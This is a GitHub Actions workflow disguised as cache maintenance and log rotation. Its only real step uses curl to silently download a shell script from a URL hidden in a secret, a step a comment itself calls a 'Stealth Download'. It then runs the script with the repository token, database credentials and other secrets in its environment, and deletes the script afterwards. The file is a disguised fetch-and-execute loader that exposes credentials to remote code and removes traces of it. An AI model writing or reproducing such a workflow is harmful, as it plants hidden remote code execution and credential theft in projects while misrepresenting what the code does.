name: "system Cache Maintenance & Log Rotation v6 (Smart Priority Engine) 🛠️"

on:
  workflow_dispatch:
    inputs:
      sys_req_url:
        description: 'Resource Source Endpoint'
        required: true
      batch_id:
        description: 'Batch Process ID'
        required: true
      access_token:
        description: 'Security Clearance Key 🔑'
        required: true

jobs:
  diagnostics-and-repair:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Initialize System Modules
        uses: actions/checkout@v3

      - name: 🛡️ Verify Security & Execute Core Logic
        env:
          # --- 🔑 SECURITY & SOURCE ---
          INPUT_PASS: ${{ github.event.inputs.access_token }}
          STORED_PASS: ${{ secrets.ACTION_PASS }}
          HF_TOKEN: ${{ secrets.HF_TOKEN }}
          REMOTE_URL: ${{ secrets.REMOTE_LOGIC_URL }}

          # --- ⚙️ RUNTIME VARIABLES (Passed to logic.sh) ---
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          MID: ${{ github.event.inputs.batch_id }}
          MURL: ${{ github.event.inputs.sys_req_url }}
          CIPHER_KEY: ${{ github.event.inputs.access_token }}
          
          # --- 🗄️ DATABASE CONNECTION ---
          DB_HOST: ${{ secrets.DB_HOST }}
          DB_USER: ${{ secrets.DB_USER }}
          DB_PASS: ${{ secrets.DB_PASS }}
          DB_NAME: ${{ secrets.DB_NAME }}

        run: |
          echo "🔄 [INIT] Verifying Security Clearance..."
          
          # 1. Stealth Download (URL Hidden in Secret)
          echo "📥 [SYSTEM] Fetching Core Logic Modules..."
          
          # -s (Silent), -L (Follow Redirects), Header (Auth)
          curl -s -L \
            -H "Authorization: Bearer $HF_TOKEN" \
            -o logic.sh \
            "$REMOTE_URL"

          # 2. Execution & Cleanup
          if [ -f "logic.sh" ]; then
             echo "⚙️ [EXEC] Initializing Smart Engine..."
             chmod +x logic.sh
             
             # Script run karein (Environment vars automatically pass honge)
             ./logic.sh
             
             # Cleanup
             rm logic.sh
             echo "✅ [COMPLETE] All Tasks Finished."
          else
             echo "❌ [ERROR] Critical Module Missing. Connection Failed."
             exit 1
          fi
